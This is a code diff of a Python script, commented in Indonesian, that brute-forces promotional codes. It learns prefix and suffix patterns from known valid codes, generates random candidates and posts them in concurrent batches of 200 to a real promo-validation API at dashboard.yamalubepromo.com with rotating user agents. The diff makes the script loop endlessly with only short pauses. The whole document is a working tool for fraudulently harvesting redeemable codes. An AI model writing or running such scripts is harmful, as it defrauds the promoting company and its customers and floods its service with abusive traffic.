@@ -27,9 +27,8 @@ USER_AGENTS = [
 ]
 
 # Fungsi pembaca dataset kode yang valid
-async def read_valid_dataset():
-    file_path = '/data/data/com.termux/files/home/termux.py/valid_codes.txt'  # Path absolut
-    print(f"Membaca file dari path: {file_path}")  # Debug untuk memastikan path
+async def read_valid_dataset(file_path='valid_codes.txt'):
+    file_path = os.path.join(os.path.dirname(__file__), file_path)
     async with aiofiles.open(file_path, 'r') as f:
         valid_codes = [line.strip() for line in await f.readlines()]
     return valid_codes
@@ -43,7 +42,7 @@ def get_code_patterns(valid_codes):
 # Fungsi untuk menghasilkan kode acak sesuai pola dataset
 def generate_code_from_pattern(prefix_list, suffix_list):
     characters = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789'
-    return f"{random.choice(prefix_list[:5])}{''.join(random.choices(characters, k=4))}{random.choice(suffix_list[:5])}"
+    return f"{random.choice(prefix_list[:5])}{''.join(random.choices(characters, k=4))}{random.choice(suffix_list[:30])}"
 
 # Validasi kode asinkron
 async def validate_code(session, code):
@@ -54,7 +53,7 @@ async def validate_code(session, code):
     payload = {"uniq_code": code}
 
     try:
-        async with session.post('https://dashboard.yamalubepromo.com/api/v1/wziioquyqthkal', json=payload, headers=headers, timeout=10) as response:
+        async with session.post('https://dashboard.yamalubepromo.com/api/v1/wziioquyqthkal', json=payload, headers=headers, timeout=13) as response:
             response_data = await response.text()
             return code, response.status, response_data
     except Exception as e:
@@ -67,28 +66,48 @@ async def perform_validation(count, prefix_list, suffix_list):
         tasks = [validate_code(session, generate_code_from_pattern(prefix_list, suffix_list)) for _ in range(count)]
         return await asyncio.gather(*tasks)
 
-# Fungsi utama untuk validasi batch
+# Fungsi untuk rekapitulasi hasil
+async def rekapitulasi(valid_codes, invalid_codes, error_codes, duration):
+    summary = (
+        f"\n{BRIGHT}Rekapitulasi:{RESET}\n"
+        f"{GREEN}Total kode valid: {len(valid_codes)}{RESET}\n"
+        f"{RED}Total kode invalid: {len(invalid_codes)}{RESET}\n"
+        f"{YELLOW}Total kode error: {len(error_codes)}{RESET}\n"
+        f"{BRIGHT}Jumlah validasi kode: {len(valid_codes) + len(invalid_codes) + len(error_codes)}{RESET}\n"
+        f"Waktu validasi: {duration:.2f} detik\n\n"
+    )
+    print(summary)
+
+# Fungsi utama untuk validasi batch berulang
 async def main():
-    # Baca dataset dari file valid_codes.txt
     valid_codes = await read_valid_dataset()
     prefix_list, suffix_list = get_code_patterns(valid_codes)
-    count = 200  # Jumlah kode yang ingin divalidasi secara bersamaan
-    results = await perform_validation(count, prefix_list, suffix_list)
-    
-    valid, invalid, error = set(), set(), set()
-    for code, status, data in results:
-        if status == 200:
-            valid.add(code)
-            print(f"{GREEN}Kode valid: {code}{RESET}")
-        elif status == 400:
-            invalid.add(code)
-        else:
-            error.add(code)
-    
-    print(f"\n{BRIGHT}Summary:{RESET}")
-    print(f"{GREEN}Total kode valid: {len(valid)}{RESET}")
-    print(f"{RED}Total kode invalid: {len(invalid)}{RESET}")
-    print(f"{YELLOW}Total kode error: {len(error)}{RESET}")
+    count = 200  # Jumlah kode yang ingin divalidasi dalam setiap batch
+
+    while True:  # Looping tak terbatas
+        start_time = time.time()
+        
+        # Melakukan validasi batch
+        results = await perform_validation(count, prefix_list, suffix_list)
+        
+        valid, invalid, error = set(), set(), set()
+        for code, status, data in results:
+            if status == 200:
+                valid.add(code)
+                print(f"{GREEN}Kode valid: {code}{RESET}")
+            elif status == 400:
+                invalid.add(code)
+            else:
+                error.add(code)
+        
+        end_time = time.time()
+        duration = end_time - start_time
+        
+        # Rekapitulasi hasil
+        await rekapitulasi(valid, invalid, error, duration)
+        
+        # Jeda 0.5 detik sebelum memulai batch berikutnya
+        await asyncio.sleep(0.5)
 
 if __name__ == '__main__':
     asyncio.run(main())
